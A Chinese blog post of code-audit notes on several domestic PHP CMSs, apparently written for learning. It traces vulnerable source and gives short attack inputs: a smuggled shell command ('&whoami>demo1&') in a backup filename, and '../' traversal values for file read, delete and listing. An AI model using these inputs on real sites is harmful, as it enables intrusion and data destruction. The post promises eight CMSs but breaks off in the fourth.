---
title: CMS 代码审计实战合集（八个国产 CMS）
date: 2024年11月8日
tags:
  - 代码审计
categories: 代码审计
description: 八个国产 CMS 的代码审计实战记录——五指、BossCMS、IBOS、KiteCMS、ZZCMS、YzmCMS、海 CMS、信呼，覆盖 SQL 注入、任意文件上传与 GetShell 等漏洞的分析与利用过程。
---

八个国产 CMS 的代码审计实战记录——五指、BossCMS、IBOS、KiteCMS、ZZCMS、YzmCMS、海 CMS、信呼，覆盖 SQL 注入、任意文件上传与 GetShell 等漏洞的分析与利用过程。

> 本篇由 8 篇内容相近的笔记合并整理，**安排如下**（按时间顺序）：

1. **五指cms代码审计**（2024年9月31日）
2. **bosscms代码审计**（2024年10月5日）
3. **IBOScms代码审计**（2024年10月7日）
4. **kitecms代码审计**（2024年10月11日）
5. **zzcms代码审计**（2024年10月13日）
6. **yzmcms代码审计**（2024年10月21日）
7. **hadcms代码审计**（2024年10月26日）
8. **xinhucms代码审计**（2024年11月8日）

---

# 1. 五指cms代码审计（2024年9月31日）

在根目录index.php中看到

![](https://pic.imgdb.cn/item/66f8e54ef21886ccc044b327.png)

其中的`./configs/web_config.php`是配置文件，`core.php`是核心框架文件

`load_class("application")`将application这个类实例化了

然后调用$app对象的run方法运行

因为是调用`load_class`加载application类，所以就是`application.class.php`

通过`load_class`来到core.php里面


![](https://pic.imgdb.cn/item/66f8e82df21886ccc047af1b.png)

里面有个`COREFRAME_ROOT`,
```
<?php
defined('WWW_ROOT') or exit('No direct script access allowed');

define('COREFRAME_ROOT',substr(dirname(__FILE__),0,-11).'coreframe'.DIRECTORY_SEPARATOR);
define('CACHE_ROOT',substr(dirname(__FILE__),0,-11).'caches'.DIRECTORY_SEPARATOR);
define('CACHE_EXT','f1q_e');
```

获取文件地址并减去最后11个字符

`COREFRAME_ROOT.'app/'.$m.'/libs/class/'.$class.'.class.php'`

这个实际上就是路径名`app目录下模块名/libs/class/类名.class.php`

实例化wuzhi_application类的时候会调用下面的构造函数将路由信息定义完成

![](https://pic.imgdb.cn/item/66f8f513f21886ccc058d92a.png)

这个是当类的实例被创建时，这个方法会自动调用

也就是说这个是

加载application类的时候，调用load_class获取application.class.php并实例化，
然后通过run获取路由信息

## sql注入

在这里存在sql漏洞

![](https://pic.imgdb.cn/item/66f90a4ff21886ccc07b2b36.png)

bp抓包

![](https://pic.imgdb.cn/item/66f90a1ff21886ccc07ad919.png)

可以定位到
`/coreframe/app/member/admin/group.php`的del()函数

![](https://pic.imgdb.cn/item/66f90f88f21886ccc082612a.png)

这里的第133行是判断groupid是否为空，134行是判断是否是数组，但是这里不管是不是他都执行了delete函数操作数据库

追踪delete函数，（我也不知道他这个追踪是怎么追踪的，我直接control f搜索delete里面好多，但是又没看到php代码审计的插件)

在`db.class.php`里面看到


![](https://pic.imgdb.cn/item/66fe4824a0d098f8981d74e6.png)

其中调用了array2sql,其中的array2sql是

![](https://pic.imgdb.cn/item/66fe49c3a0d098f8981f2334.png)

可以得出是将数组转换成sql语言并移除一些特殊符号防止sql注入

```
if(is_array($data)) {
    $sql = '';
    foreach ($data as $key => $val) {
        $val = str_replace("%20", '', $val);
        $val = str_replace("%27", '', $val);
        $val = str_replace("(", '', $val);
        $val = str_replace(")", '', $val);
        $val = str_replace("'", '', $val);
        $sql .= $sql ? " AND `$key` = '$val' " : " `$key` = '$val' ";
    }
    return $sql;
}
- 如果 $data 是一个数组，则初始化一个空字符串 $sql。
- 遍历数组，将每个键值对转换为 SQL 格式的条件。
- 使用 str_replace 函数移除一些特殊字符（如 %20, %27, (, ), '），以防止 SQL 注入。
- 将每个条件拼接成一个 SQL WHERE 子句，多个条件之间用 AND 连接。

```


只有最下面的那行
```
return $this->master_db->delete($table, $where);
```
是对数据库进行操作的

`$this->master`是对数据库进行连接的

在目录内查找delete，在`mysqli.class.php`中发现是`WUZHI_mysqli`类下的方法

```
public function __construct($config_file = 'mysql_config')
获取www/configs/mysql_config.php中mysql的配置信息
{
		$this->mysql_config = get_config($config_file);
		$this->dbname = $this->mysql_config[$this->db_key]['dbname'];
		$this->tablepre = $this->mysql_config[$this->db_key]['tablepre'];
		$this->dbcharset = $this->mysql_config[$this->db_key]['dbcharset'];

		$this->slave_server = isset($this->mysql_config[$this->db_key]['slave_server']) ? $this->mysql_config[$this->db_key]['slave_server'] : '';

		$class = $this->mysql_config[$this->db_key]['type'];
		require_once(COREFRAME_ROOT.'app/core/libs/class/'.$class.'.class.php');
		$classname = 'WUZHI_'.$class;
		$this->master_db = new $classname($this->mysql_config[$this->db_key]);
		if($this->slave_server) {
			$slave_server = weight_rand($this->slave_server);
			if($slave_server=='default') {
				$this->read_db = $this->master_db;
			} else {
				$this->read_db = new $classname($this->mysql_config[$this->slave_server]);
			}
		} else {
			$this->read_db = $this->master_db;
		}
	}

```


![](https://pic.imgdb.cn/item/66fe78a5335a200d6a9b443b.png)


在mysqli.class.php中，他没有做任何过滤直接将语句拼接到`$sql`并通过query（）执行，所以存在sql漏洞


![](https://pic.imgdb.cn/item/66fe7904335a200d6a9b891f.png)


这里可以进行报错注入

## 任意文件写入


![](https://pic.imgdb.cn/item/66ff6d72d29ded1a8c8b4be0.png)

通过seay审计发现里面有个file_put_content函数可能存在任意文件写入，进去查看发现这里是通过data内容可以控制写入文件的内容

![](https://pic.imgdb.cn/item/66ff6dd7d29ded1a8c8b9b1e.png)

![](https://pic.imgdb.cn/item/66ff6e59d29ded1a8c8c0523.png)

这phpstorm中找到他的funvtion`set_cache`

他只判断是了是否提交了表单但没对提交的内容进行过滤，这就导致`setting `参数也就是上面所说的 `$data` 部分写入造成任意文件写入

![](https://pic.imgdb.cn/item/67076359d29ded1a8c69640b.png)

如果没有提交表单，就会通过`get_cache`读取缓存文件

![](https://pic.imgdb.cn/item/67076392d29ded1a8c699bd2.png)

所以我们可以这么构造文件读写

```
/index.php?
m=attachment&f=index&v=ueditor&_su=wuzhicms&submit=XXX&setting=payload
```

## CSRF

在这里

![](https://pic.imgdb.cn/item/66ff820fd29ded1a8c9c0012.png)

当我们提交的时候发现

![](https://pic.imgdb.cn/item/66ff822dd29ded1a8c9c18e4.png)

提示了账号不存在，说明必须要一个前台账号才能设置为系统管理员账号，

![](https://pic.imgdb.cn/item/66ff84ffd29ded1a8c9ee282.png)

抓包发现添加管理员的路由，找到源码`/coreframe/app/core/admin/power.php`

```
这段代码是一个名为 add 的方法，用于添加管理员。以下是详细分析：
检查是否提交表单：
if(isset($GLOBALS['submit'])) {
检查全局变量 $GLOBALS['submit'] 是否存在，以确定是否提交了表单。
验证用户名：
if(empty($GLOBALS['form']['username'])) MSG(L('parameter error'));
$username = $GLOBALS['form']['username'];
$r = $this->db->get_one('member', array('username' => $username));
if(!$r['uid']) MSG(L('账号不存在，请先管理会员处－添加账号'));
检查表单中的 username 是否为空，如果为空则显示错误消息。
获取表单中的 username 并从 member 表中查找对应的记录。
如果找不到对应的用户 ID (uid)，则显示错误消息。
检查管理员是否已存在：
$rs = $this->db->get_one('admin', array('uid' => $r['uid']));
if($rs) MSG(L('管理员已存在！'));
从 admin 表中查找对应的用户 ID (uid)。
如果找到记录，则显示管理员已存在的消息。
准备表单数据：
$formdata = array();
$formdata['uid'] = $r['uid'];
if(empty($GLOBALS['form']['password'])) {
    $formdata['password'] = '';
} else {
    $factor = substr(random_string('md5'), 0, 6);
    $password = md5(md5($GLOBALS['form']['password']) . $factor);
    $formdata['password'] = $password;
    $formdata['factor'] = $factor;
}
$formdata['role'] = ',' . implode(',', $GLOBALS['form']['role']) . ',';
$formdata['truename'] = remove_xss($GLOBALS['form']['truename']);
初始化一个空数组 $formdata。
将用户 ID (uid) 添加到 $formdata。
检查表单中的 password 是否为空，如果为空则设置为空字符串。
如果不为空，则生成一个随机因子 (factor)，并使用 MD5 加密密码和因子。
将加密后的密码和因子添加到 $formdata。
将角色信息和真实姓名添加到 $formdata。
插入数据并显示成功消息：
$this->db->insert('admin', $formdata);
MSG(L('operation success'));
将 $formdata 插入到 admin 表中。
显示操作成功的消息。
显示添加管理员表单：
} else {
    $show_formjs = 1;
    $form = load_class('form');
    $roles = $this->db->get_list('admin_role', '', '*', 0, 100);
    include $this->template('power_add');
}
如果没有提交表单，则显示添加管理员的表单。
设置 show_formjs 为 1。
加载表单类并获取角色列表。
包含并显示 power_add 模板。
```
在代码38行处根据用户名
从数据库中取出前台账户，如果该前台用户不存在则会提示如下内容，也就是我们上面的提示，在40行代码判断该用户是否已经是管理员，而44-51行代码是判断添加管理员时是否设置密码，这部分操作在上面部分我们添加管理员的时候也可以看得出来，在代码54行将我们的内容插入到数据库中


![](https://pic.imgdb.cn/item/66ff9600d29ded1a8caede21.png)


能看出来这部分没有进行token校验或者其他手段，这就导致我们可以伪造数据包进行csrf

## 目录遍历

glob函数发现存在目录遍历，这里面的`glob()`的$`dir`参数可控,上面的18行做了一些过滤

![](https://pic.imgdb.cn/item/66ff97d7d29ded1a8cb0a8db.png)

29行通过`include $this ->template('listing')`包含并渲染旗下的`listing.tpl.php`文件

```
glob()函数返回一个包含匹配指定模式的文件名或目录的数组

语法：
glob(pattern,flags)
    pattern
    必需。规定检索模式。
    flags
    可选。规定特殊的设定。
返回值：
该函数返回一个包含有匹配文件/目录的数组。如果失败则返回 FALSE。

```

payload

```
index.php?m=template&f=index&v=listing&_su=wuzhicms
```

## 任意文件删除

全局查找危险函数unlink（删除指定文件）

发现my_unlink里面调用了这个函数

![](https://pic.imgdb.cn/item/66ff9ac3d29ded1a8cb349bb.png)

跟踪一下

其中一个位于del()函数内部，

![](https://pic.imgdb.cn/item/66ff9b1fd29ded1a8cb39675.png)


这两个地方需要传入id和url，但是通过`remove_xss`函数过滤了

![](https://pic.imgdb.cn/item/66ff9b73d29ded1a8cb3dcf6.png)

这里是对我们输入的东西进行实体编码，替换了一些文字防止` <IMG SRC=@avascript:alert('XSS')> 的攻击`，下面过滤了一些js的标签


回到del（）函数，他里面是鲜活的一个id，然后从数据库查找这个id对应的path，但是如果没有id的话会直接根据你输入的path进行文件操作，所以我们只需要构造path就可以了



![](https://pic.imgdb.cn/item/6707b1fbd29ded1a8cbd49d9.png)

![](https://pic.imgdb.cn/item/6707b154d29ded1a8cbcb023.png)

所以可以

![](https://pic.imgdb.cn/item/6707651cd29ded1a8c6b20ec.png)

至此,五指cms的审计结束

---

# 2. bosscms代码审计（2024年10月5日）

先分析路由

![](https://pic.imgdb.cn/item/6700e7d8d29ded1a8cc33f37.png)

上面是对一些常量进行定义，并且在下面引入了
```
system/enter.php
```
文件，


![](https://pic.imgdb.cn/item/6700fb52d29ded1a8cd5cddd.png)


在这里的时候依旧是定义了一些常量，但在最后包含了into.class.php的into类下面的load()方法，跟进

在load()方法中，调用了同类下的load_class()方法，这里我们看到的bosscms_type就是在enter.php里面的常量，后面传入的三个参数
```
defined('BOSSCMS_TYPE') ? BOSSCMS_TYPE : null 检查常量 BOSSCMS_TYPE 是否定义，如果定义了则使用其值，否则使用 null。
BOSSCMS_MOLD、BOSSCMS_PART 和 BOSSCMS_FUNC 是预定义的常量，分别表示模块、部分和函数。

```
在`load_class()`方法中需要传入四个参数，第一个参数 $type 是判断该功能点是前台功能点还是后台功能
点，也就是决定代码19行的$type路径是在哪个文件夹下，由于SYSTEM_PATH常量定义为system目录
下，所以系统的功能性代码都放在了该目录下。 $mold 参数定位功能目录， `$part` 决定调用目录下哪个
php文件， `$func` 则是定位文件下调用的方法。
在代码第20行如果上面的 $file 不存在则尝试加载plugin文件下的php文件用来加载插件。在代码第30
行包含 `$file` 。32-35行代码使用 `call_user_func()` 回调函数实现类中方法的调用。

![](https://pic.imgdb.cn/item/6701012fd29ded1a8cdb1b9b.png)

## udritor编辑器文件上传漏洞


![](https://pic.imgdb.cn/item/6701f303d29ded1a8cbf102c.png)

在安全设置中发现可以添加上传文件的后缀名，（这个PHP是我添加的）

然后在上传logo文件上传php的时候却被提示该文件拓展名不允许上传

抓包找到路由

![](https://pic.imgdb.cn/item/6701f371d29ded1a8cbf6bbf.png)

也是定义了一些常量，10行通过包含enter.php进行路由的选择

![](https://pic.imgdb.cn/item/6701f3ebd29ded1a8cbfda2e.png)

抓包里面是`action=uploadimage`，

对应的选择是uploadimage方法上传图片，case的使用方法和c语言的case类似,其中使用的config来读取分支``config[`imageActionName`]``


![](https://pic.imgdb.cn/item/6701fc8fd29ded1a8cc6fe44.png)


而config在上面也获得了

![](https://pic.imgdb.cn/item/6702020cd29ded1a8ccc3c11.png)

`$this->config = into::load_json("config.json"); 调用 into 类的 load_json 方法加载 config.json 文件，并将其内容赋值给 $this->config 属性。`


![](https://pic.imgdb.cn/item/6702081ad29ded1a8cd213c9.png)


上面那个action传入的，在这里成了imageActionName，对应上了上面的那个的case中的

![](https://pic.imgdb.cn/item/67022cc9d29ded1a8cf2e096.png)

```
查文件上传：

if(isset($_FILES[$this->config['imageFieldName']])){

检查是否有文件通过表单上传，表单名称为 imageFieldName。

获取上传文件：

$file = $_FILES[$this->config['imageFieldName']]; 获取上传的文件信息。

检查文件大小：

if($file['size'] <= $this->config['imageMaxSize']){

检查文件大小是否在允许的最大值 imageMaxSize 之内。

上传文件：

if(upload::files($file, $this->config['imagePathFormat'], 'photo')){
调用 upload::files 方法上传文件，路径格式为 imagePathFormat，文件类型为
photo。

上传成功：

如果上传成功，返回 JSON 编码的成功信息，包括文件的 URL、标题和原始名称。

上传失败：

如果上传失败，返回 JSON 编码的错误信息，错误状态为 upload::$msg。

文件大小超限：

如果文件大小超过限制，返回 JSON 编码的错误信息，状态为 超过ueditor的图片上传大小限制。
```
这里的关键是upload::files函数

跟踪files，在第60行发现我们刚才被限制的

![](https://pic.imgdb.cn/item/67022fd0d29ded1a8cf553c6.png)

向上追溯发现有两个限制条件，

第一个是检查我们上传的文件拓展名`$ext`是否在允许的扩展名列表中`$extension`

第二个是判断`$type`是否为空，如果为空的话表示不需要进一步检查文件类型，如果不为空且`$in`为false的话，说明需要检查文件类型，但文件类型不在指定的类型中

从第一个我们追溯extension可以得到

![](https://pic.imgdb.cn/item/67023967d29ded1a8cfe85ae.png)

他取决与upload_extension的，全局搜索以后发现这个是我们自己设置的那个，所以这个天然成立

另一个的话我们如果想满足前面的`!type=true`就需要使得程序运行到第36行`$type=NULL`，所以要满足`$k`在`$tarr`里面，`tarr`是我们上传的files的第三个参数photo
而这里的`$k`是从`$G[extension]`获取的，

这里应该是调试，但是不知道为什么我调试环境一直不对，从教程来看的话是说这里的`.php`后缀在code类型而该功能点传入的类型为photo所以这里应该是不满足第二个条件导致的不能实现文件上传

在`extension.json`里面看到了`externsion`里面的东西

所以想要实现php的文件上传，我们必须要满足type的类型为code才行

![](https://pic.imgdb.cn/item/670282dcd29ded1a8c42769d.png)

全局搜索`files()`方法调用，发现该功能点的传入类型有code，所以可以实现文件上传

![](https://pic.imgdb.cn/item/67028361d29ded1a8c42eba0.png)

## 任意文件删除

在`超过ueditor.class.php`里面还有一个delete()方法，可以对文件进行删除

![](https://pic.imgdb.cn/item/67032e82d29ded1a8cc3afbf.png)

这里也是进行了两个判断

- 判断post参数里面是否包含path参数
- 判断传入的path参数是否以upload开头

都满足的话进下面的`store_type`判断，判断是否是为空，如果不为空的话调用oss类的delete，如果为空的话调用dir类的delete()

所以关键是在`store_type`，全局搜索发现是一个存储的，默认为0

![](https://pic.imgdb.cn/item/6703307dd29ded1a8cc4eceb.png)

跟进dir类下的delete()方法查看该方法：

![](https://pic.imgdb.cn/item/670330c0d29ded1a8cc515ea.png)

经过`replace`函数方法后使用`id_files`函数检查路径是否执行一个文件，使得若进行`unlink`删除，我们跟进`replace`看是否存在过滤

![](https://pic.imgdb.cn/item/670331d1d29ded1a8cc5c454.png)

他这里并没有进行过滤，只是 对`//,///`的路径进行了省略优化，所以可以直接调用路由

payload:`path=upload/../xxxx`(删除的是根目录下的)

![](https://pic.imgdb.cn/item/670331bed29ded1a8cc5b91e.png)


## 目录遍历漏洞

同样在`uedirot.class.php`下的还有list方法，在327行的`$folder`是GET传入的没有任何过滤就拼接到了`$path`中

![](https://pic.imgdb.cn/item/670364c3d29ded1a8cf5ffd7.png)

在里面有一个read()方法，这里的332,335行都调用了这个方法，从上面的审计中我们可以知道这个地方是选择远程oss读取还是本地读取，所以是二选一必须走一个

oss的是远程读取的，我们选择对dir的本地读取的read下手

分析可得，这个方法使用opendir函数打开目录句柄，readdir函数读取目录内容，在这个文件最上面的replace函数之前分析过是进行路径优化的，而且132行的`$is_dir`是判断是目录还是文件，所以说如果这里的`$path`可控的话就可以导致目录遍历

![](https://pic.imgdb.cn/item/67037606d29ded1a8c085ef6.png)

回到lists方法，全局搜索找到

![](https://pic.imgdb.cn/item/67037985d29ded1a8c0cd47d.png)

这李通过lists传入了一个``config[`fileMangerListPath`]``

全局搜索发现使用一个列出文件目录的东西

![](https://pic.imgdb.cn/item/67037a06d29ded1a8c0d786c.png)

找到该值是upload/路径，也就是说上面要读取的文件是upload目录下的文件，我们从上面的分析中可以知道lists()方法中传入的 $folder 参数没有进行过滤就拼接到 `$path`中所以这里是存在目录遍历的。

所以我们要找在哪调用了`listfile`方法

由之前的可以知道，我们调用路由是通过改目录文件下的，在最开始的时候我们调用里init方法，在里面通过传输action参数实现类中方法的实行


![](https://pic.imgdb.cn/item/67037d90d29ded1a8c11852b.png)

![](https://pic.imgdb.cn/item/67037e1bd29ded1a8c120533.png)

我们可以构造路由
```
/system/extend/ueditor/php/controller.php?action=listfile&folder=../../../
```

![](https://pic.imgdb.cn/item/67037e7fd29ded1a8c127277.png)


## 任意文件下载

在这里存在一个sql的任意文件下载漏洞

![](https://pic.imgdb.cn/item/6703b698d29ded1a8c5f5009.png)

我们抓包看看

![](https://pic.imgdb.cn/item/6703b714d29ded1a8c5ff255.png)

可以看到路由是safe下的backup

![](https://pic.imgdb.cn/item/6703b7dcd29ded1a8c60db40.png)

这里直接`get`了一个`id`，然后直接拼接路径中

这里的sql是上面已经定义的路径

而后在第73行使用readfile函数进行文件读取，中间没有做任何过滤，所以可以通过

`../`实现目录跳转来读取文件


![](https://pic.imgdb.cn/item/6703b8a4d29ded1a8c61cc93.png)


![](https://pic.imgdb.cn/item/6703b83bd29ded1a8c614c00.png)


## 权限校验处存在逻辑缺陷

在第一个`ueditor.class.php`中，有这么两条

![](https://pic.imgdb.cn/item/6703ba76d29ded1a8c6412c2.png)

`ueditor`类继承了`admin`类,最上面通过`basic_class()`来加载`admin.class.php`文件，，跟进这个方法

![](https://pic.imgdb.cn/item/6703bad4d29ded1a8c6491e1.png)

这里设置了`$func`参数，如果没有就默认设置成`init`，而且在最下面调用`load_class`加载类文件，再通过类加载`admin`的`init()`方法，

这里通过`init`调用`session`get一个session，如果为空的话判断是否定义了`IS_LOGIN`，如果未定义的话就重定向刀登陆界面，但是跳转结束以后代码没有`die`，他就会继续调用init导致上面的鉴权无效

![](https://pic.imgdb.cn/item/6703bcf0d29ded1a8c6739f8.png)


至此结束bosscms

---

# 3. IBOScms代码审计（2024年10月7日）

## 命令执行

![](https://pic.imgdb.cn/item/6703e174d29ded1a8c971ad2.png)

在这里的只有这个地方可以修改，猜测可能存在文件读取，命令执行，sql注入等 漏洞，抓包查看路由以及传参

![](https://pic.imgdb.cn/item/6703e12ad29ded1a8c96be55.png)

![](https://pic.imgdb.cn/item/6703f031d29ded1a8ca66be2.png)


这里使用了`dbSubmit`，这个在数据包中发现是1，这里的作用是检查表单是否已经提交

在第33行调用了`database`的`databaseBackup()`方法，跟进一下

![](https://pic.imgdb.cn/item/6703f31cd29ded1a8ca95c5a.png)

这里235行通过控制`filename`参数来控制我们上传的文件名，236行对一些后缀进行了过滤


> getRequest()方法则是获取我们不同类型的请求参数，getQuery、getPost、getParam这些方法是YII框
架下封装好的一些获取请求参数的方法这些方法可直接调用

![](https://pic.imgdb.cn/item/6703f5f1d29ded1a8cac3899.png)

我们知道`filename`可控，那我们就跟踪`$filename`

![](https://pic.imgdb.cn/item/6703f5dbd29ded1a8cac1ebc.png)

这里是将`/  \\  .  '`替换成了空进行了第二次过滤后赋值给`$backupFileName`

下面设置`$method=multivol`，并将`$backupFileName`赋值给`$dumpFile`

![](https://pic.imgdb.cn/item/6703f6e6d29ded1a8cad3602.png)

else的话也是经过分支拼接到`dumpFile`,但是这里的`dumpFile`后续会被拼接到这里

![](https://pic.imgdb.cn/item/6703f7c1d29ded1a8cae729e.png)

这里用到了反引号并且`dumpfile`可控，所以我们可以传入
```
&whoami>demo1&
```

进行命令执行

## sql注入

在标签页

![](https://pic.imgdb.cn/item/67052812d29ded1a8ca9d268.png)

里面的汇报中

![](https://pic.imgdb.cn/item/6705282dd29ded1a8ca9ea51.png)

存在sql的报错

![](https://pic.imgdb.cn/item/6705282cd29ded1a8ca9ea16.png)

抓包看看

![](https://pic.imgdb.cn/item/6705285dd29ded1a8caa1698.png)

通过api控制器调用了module层的getlist类，跟进查看

![](https://pic.imgdb.cn/item/670529ecd29ded1a8cab7f41.png)

结合数据包我们可以发现存在问题的是`keyword`的`subject`

跟踪一下发现

![](https://pic.imgdb.cn/item/67052a9dd29ded1a8cac1bb9.png)

30行判断`keyword`是否存在，32行将他带入到`getListCondition`里面,`getListCondition`是进行sql拼接查询的，将结果带入到33行的`getListCondition`方法进行的sql参数执行的操作


这里教程是用的debug的方式查看参数的传递过程，但是不知道为什么我的xdebug每次一调试就是

![](https://pic.imgdb.cn/item/67061b80d29ded1a8c654eb0.png)

导致我调试不了


教程是说

这里经过调试最后返回的结果是完整的没对特殊字符进行过滤的完整sql语句

![](https://pic.imgdb.cn/item/67061ca1d29ded1a8c66e26d.png)


原因是YII框架的DB类库没有对sql进行处理兵器开发人员在二次开发的过程中没对报错进行异常捕获导致产生错误


## 文件上传

![](https://pic.imgdb.cn/item/67066381d29ded1a8c9f7e82.png)

这里可以自定义上传的文件类型，所以我们可以通过修改这个来进行文件上传，发现定义了.php还是不能上传

![](https://pic.imgdb.cn/item/67066494d29ded1a8ca04bc2.png)

抓包分析路由

![](https://pic.imgdb.cn/item/6706944ed29ded1a8cc5fe75.png)

这里是调用的file文件夹下面的personal的add，所以我们能找到`actionadd`
方法，这个方法是通过op参数帮助我们进行功能定位，但是他会先调用`actionindex`方法获取后台配置参数

![](https://pic.imgdb.cn/item/670697c6d29ded1a8cc8f23e.png)

在 `actionIndex` 方法中调用了`getUploadConfig`获取上传配置参数

![](https://pic.imgdb.cn/item/67069809d29ded1a8cc924e4.png)

跟踪发现进行了一些过滤

![](https://pic.imgdb.cn/item/6706984bd29ded1a8cc95c17.png)

他107的`dangerTags`中如果存在变量就要unset

![](https://pic.imgdb.cn/item/670698a6d29ded1a8cc9a039.png)


所以我们的php没法上传

但是我们真正上传的类中还包含着过滤

![](https://pic.imgdb.cn/item/670698f1d29ded1a8cc9dd34.png)

它调用了`CommonAttach`类下的方法，这里面封装着所有用于上传的方法


![](https://pic.imgdb.cn/item/67069948d29ded1a8cca21ff.png)

这里的`checkExt`就是第二处过滤的地方了

![](https://pic.imgdb.cn/item/67069973d29ded1a8cca4268.png)

所以我们可以用
```
gif

.htaccess
```

等等进行文件上传


## 任意文件读取

查找危险函数unlink，发现这个

![](https://pic.imgdb.cn/item/67069b02d29ded1a8ccbd4b9.png)


这里通过post获取`kety`，然后判断是不是文件就进行了删除


所以可以抓一个删除包然后进行`../`的返回，类似这样

![](https://pic.imgdb.cn/item/67069b7ad29ded1a8ccc479d.png)

至此，结束iboscms

总结：

yii框架有明显的过滤但是在module层没有封装好导致可能存在sql漏洞

unlink危险函数

---

# 4. kitecms代码审计（2024年10月11日）

kitecms是基于thinkphp5搭建的，这个我搭建的时候按照两个方法都失败了，访问`/install`的时候安装不跳转，数据库安装倒是成功了`/config/database.php`也配置好了但是访问的时候报错

就很奇怪

所以我就单纯的看着教程和源码进行审计学习了

thinkphp5.1比较上一代5.0，将配置目录和路由定义单独出来不在防御应用类库目录中（不可更改哦）

## 目录架构

```
www WEB部署目录（或者子目录）
├─application           应用目录
│ ├─common             公共模块目录（可以更改）
│ ├─module_name       模块目录
│ │ ├─common.php     模块函数文件
│ │ ├─controller     控制器目录
│ │ ├─model           模型目录
│ │ ├─view           视图目录
│ │ ├─config         配置目录
│ │ └─ ...           更多类库目录
│ │
│ ├─command.php       命令行定义文件
│ ├─common.php         公共函数文件
│ └─tags.php           应用行为扩展定义文件
│
├─config               应用配置目录
│ ├─module_name       模块配置目录
│ │ ├─database.php   数据库配置
│ │ ├─cache           缓存配置
│ │ └─ ...
│ │
│ ├─app.php           应用配置 相当于5.0中config.php
│ ├─cache.php         缓存配置
│ ├─cookie.php         Cookie配置
│ ├─database.php       数据库配置
│ ├─log.php           日志配置
│ ├─session.php       Session配置
│ ├─template.php       模板引擎配置
│ └─trace.php         Trace配置
│
├─route                 路由定义目录
│ ├─route.php         路由定义
│ └─...               更多
│
├─public               WEB目录（对外访问目录）
│ ├─index.php         入口文件
│ ├─router.php         快速测试文件
│ └─.htaccess         用于apache的重写
│
├─thinkphp             框架系统目录
│ ├─lang               语言文件目录
│ ├─library           框架类库目录
│ │ ├─think           Think类库包目录
│ │ └─traits         系统Trait目录
│ │
│ ├─tpl               系统模板目录
│ ├─base.php           基础定义文件
│ ├─convention.php     框架惯例配置文件
│ ├─helper.php         助手函数文件
│ └─logo.png           框架LOGO文件
│
├─extend               扩展类库目录
├─runtime               应用的运行时目录（可写，可定制）
├─vendor               第三方类库目录（Composer依赖库）
├─build.php             自动生成定义文件（参考）
├─composer.json         composer 定义文件
├─LICENSE.txt           授权说明文件
├─README.md             README 文件
├─think                 命令行入口文件


```
## 代码审计

由于该系统使用的是thinkphp框架，所以我们在审计的时候需要着重观察application文件夹下面的文件，

```
├admin                        后台代码
├index                        前台代码
├install                      安装代码
├member                       用户注册以及会员的响应代码
```


### 文件上传漏洞

（我没搭建成功，所以用的是教程里面的）

![](https://pic.imgdb.cn/item/6708c4bdd29ded1a8c820b42.png)
这里是对上传的文件进行了配置，

这里教程选择抓包查看路由配置信息

![](https://pic.imgdb.cn/item/6708cf8bd29ded1a8c8b3bc4.png)

`admin`的`site`的`config`，这里的html是伪静态，其实还是调用的`config()`方法

（我们可以在`config`的`app.php`中看到他开了伪静态）

![](https://pic.imgdb.cn/item/6708d18bd29ded1a8c8cd1f8.png)

打开`site.php`，查看里面的`config`函数

![](https://pic.imgdb.cn/item/6708d864d29ded1a8c92876f.png)


20行调用了`isAjax`判断是否是Ajax请求，然后通过`Request::param`获取来自前端的数据并存储到`$request`中，

![](https://pic.imgdb.cn/item/6708e17dd29ded1a8c9be074.png)

刚刚应该是在哦后台的时候添加了一个php的文件使得其可传输，所以我们我们抓一个上传的包看一眼就可以了

上传包中都调用了`uploadFile`方法，全局搜索一下


![](https://pic.imgdb.cn/item/6708e213d29ded1a8c9c9ea2.png)


这里调用了`Request::file`函数接收来自上传的文件,

这里启了一个uploadfile的函数是获取当前站点id然后创建一个新的`uploadfile`的实例，跟踪一下

![](https://pic.imgdb.cn/item/6708e2e0d29ded1a8c9d8d80.png)

![](https://pic.imgdb.cn/item/6708e354d29ded1a8c9df8c6.png)

首先从`config\site.php`获取site中的`uploadfile`和`imagewater`并且将其通过`array_merge`合并到一起，然后获取我们之前传入数据库的内容与配置文件进行合并

![](https://pic.imgdb.cn/item/6708e55bd29ded1a8ca06927.png)

这里也做了一些限制

继续顺着`uploadfile`，下面调用了`upload`函数，这里使用了`filetype`获取上传类型然后通过check检查后缀以及大小

![](https://pic.imgdb.cn/item/6708e600d29ded1a8ca129fd.png)

case完了以后通过`upload`实现文件上传


所以我们只需要在后台设置`.php`可上传，然后传就可以了

## 任意文件读写

通过全局搜索我们发现存在`file_put_contents`函数，

![](https://pic.imgdb.cn/item/670906eed29ded1a8cc0288e.png)

而且里面的`html`参数可控，也就是说`file_put_contents`传入的内容可控

`htmlspecialchars_decode`是将由`htmlspecialchars`转换的html尸体进行解码，在前面的`rootpath`向上回溯发现是将根路径、主题文件夹、主题名称和文件相对路径拼接成一个完整的文件路径

![](https://pic.imgdb.cn/item/670909e1d29ded1a8cc24cef.png)

这里的`$rootpath`通过param接收`$path`，而path是request获得的path路径，所以这个地方的`$path`可控

![](https://pic.imgdb.cn/item/67090af7d29ded1a8cc31ab3.png)

![](https://pic.imgdb.cn/item/67090b05d29ded1a8cc32612.png)

![](https://pic.imgdb.cn/item/67090a8bd29ded1a8cc2cf87.png)

这里 相当于本来在`404.txt`中写但是改成了在`robots.txt`中加了一句`ceshi`,实现了任意文件读写

## 任意文件读取

全局搜索`file_get_contents`，发现在上面那个`file_put_contents`的在一个函数中，分析一下发现

![](https://pic.imgdb.cn/item/6709262cd29ded1a8cd89d33.png)

他判断是不是post传参，如果不是的话走下面的else判断里面的`rootpath`，上面我们分析了`rootpath`里面的`$path`可控，所以这里会造成任意文件读取


![](https://pic.imgdb.cn/item/670927f3d29ded1a8cd9facd.png)

它上面最后调用了
```
            return $this->fetch('fileedit', $data);
```
渲染`filedit`并将`$data`传给他

所以存在任意文件读取

![](https://pic.imgdb.cn/item/67092889d29ded1a8cda81b5.png)


![](https://pic.imgdb.cn/item/670928a6d29ded1a8cda9cda.png)


## phar反序列化

php使用的是内置的流包装器实现复杂的文件处理共嗯，内置包装器可用与文件系统函数

```常见的流包装器

file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
zlib:// — 压缩流
data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流


```

![](https://pic.imgdb.cn/item/6709305dd29ded1a8ce15840.png)

